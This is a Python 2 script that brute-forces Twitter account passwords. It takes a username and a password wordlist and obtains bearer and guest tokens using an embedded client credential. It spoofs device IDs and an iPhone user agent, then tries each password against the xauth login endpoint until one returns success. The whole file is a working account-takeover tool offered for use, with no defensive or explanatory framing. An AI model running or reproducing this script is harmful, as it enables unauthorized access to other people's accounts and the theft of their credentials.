# -*- coding: utf-8 -*-


### made with <3
### 😀❤
import requests
import string
import json
from strgen import StringGenerator as SG


userput = raw_input('enter the username:')
passput = open(raw_input('password list :'))
for passwords in passput.read().splitlines():
		randomClinetDeviceID = SG("[\u\d]{8}-[\u\d]{4}-4[\u\d]{3}-[\u\d]{4}-[\u\d]{12}").render()
		randomClientUUID = SG("[\u\d]{8}-[\u\d]{4}-4[\u\d]{3}-[\u\d]{4}-[\u\d]{12}").render()
		url = 'https://api.twitter.com/oauth2/token'
		headers = {'Host': 'api.twitter.com' , 'X-Twitter-Client-DeviceID':randomClinetDeviceID, 'Authorization':'Basic SVFLYnRBWWxYTHJpcExHUFdkMEhVQTpHZ0RZbGtTdmFQeEd4QzRYOGxpd3BVb3FLd3dyM2xDQURiejhBN0FEVQ==','X-Client-UUID':randomClientUUID,'Content-Type':'application/x-www-form-urlencoded'}
		data = 'grant_type=client_credentials'
		get_access_token_ = requests.post(url, data=data,headers=headers)
		json_format_token = json.loads(get_access_token_.content)
		access_token = json_format_token['access_token']
		url1 = 'https://api.twitter.com/1.1/guest/activate.json'
		headers1 = {'Host': 'api.twitter.com' , 'X-Twitter-Client-DeviceID':randomClinetDeviceID, 'Authorization':'Bearer '+access_token+'','X-Client-UUID':randomClientUUID}
		data1 = ''
		get_guest_token_ = requests.post(url1, data=data1,headers=headers1)
		json_guest_token = json.loads(get_guest_token_.content)
		guest_token=json_guest_token['guest_token']
		url22 = 'https://api.twitter.com/auth/1/xauth_password.json'
		headers22 = {'User-Agent':'Twitter-iPhone/8.27.1 iOS/13.3 (Apple;iPhone10,6;;;;;1;2017)','Host': 'api.twitter.com' , 'X-Twitter-Client-DeviceID':randomClinetDeviceID, 'Authorization':'Bearer '+access_token+'','X-Client-UUID':randomClientUUID,'X-Guest-Token':guest_token,'Content-Type':'application/x-www-form-urlencoded'}
		data22 = 'send_error_codes=1&x_auth_identifier='+userput+'&x_auth_login_verification=true&x_auth_password='+passwords+''
		brute_force = requests.post(url22, data=data22,headers=headers22)
		if brute_force.status_code == 401:
			print('false '+passwords+'')
		elif brute_force.status_code == 200:
			print('nice the password for user:'+str(userput)+' is '+str(passwords)+'')
			exit()
		else:
			print('somthing wrong maybe block ?')
			
